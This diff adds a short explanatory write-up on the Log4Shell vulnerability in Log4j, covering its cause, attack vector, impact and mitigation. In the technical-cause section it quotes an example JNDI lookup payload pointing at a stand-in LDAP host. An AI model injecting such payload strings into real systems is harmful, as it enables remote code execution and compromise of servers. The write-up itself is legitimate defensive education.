@@ -1,0 +1,14 @@
+Overview
+Log4j is a widely used Java-based logging framework integrated into thousands of enterprise applications and cloud services. In December 2021, a critical vulnerability (CVE-2021-44228), commonly known as “Log4Shell,” was publicly disclosed. The flaw allowed remote code execution (RCE) on affected servers with minimal interaction, making it one of the most impactful software vulnerabilities in modern computing.
+
+Technical Cause
+The vulnerability originated from Log4j’s support for expression substitution through the ${} syntax. When applications logged a string containing a JNDI (Java Naming and Directory Interface) lookup expression, such as ${jndi:ldap://example.com/a}, Log4j attempted to resolve it automatically. JNDI allows remote resource loading, and in this case, it enabled attackers to redirect the lookup to a malicious LDAP or RMI server hosting hostile Java code.
+
+Attack Vector
+An attacker could deliver a payload through any user-controlled input that gets logged by the server—HTTP headers, form fields, chat messages, or even usernames. Once the string was logged, Log4j performed the JNDI lookup, retrieved code from the attacker-controlled server, and executed it with the privileges of the vulnerable application.
+
+Impact
+The vulnerability enabled full system compromise without authentication. Global exploitation occurred within hours of disclosure, affecting cloud providers, enterprise applications, online services, and even embedded devices. Attackers deployed cryptominers, botnets, ransomware loaders, and data exfiltration tools. The widespread use of Log4j made Log4Shell a critical supply-chain security event.
+
+Mitigation
+Remediation included upgrading to Log4j 2.16+, disabling the JNDI lookup feature, blocking outbound LDAP/RMI traffic, and deploying runtime application self-protection (RASP) solutions. The event highlighted the risks of widely used open-source components and the necessity of secure library design.
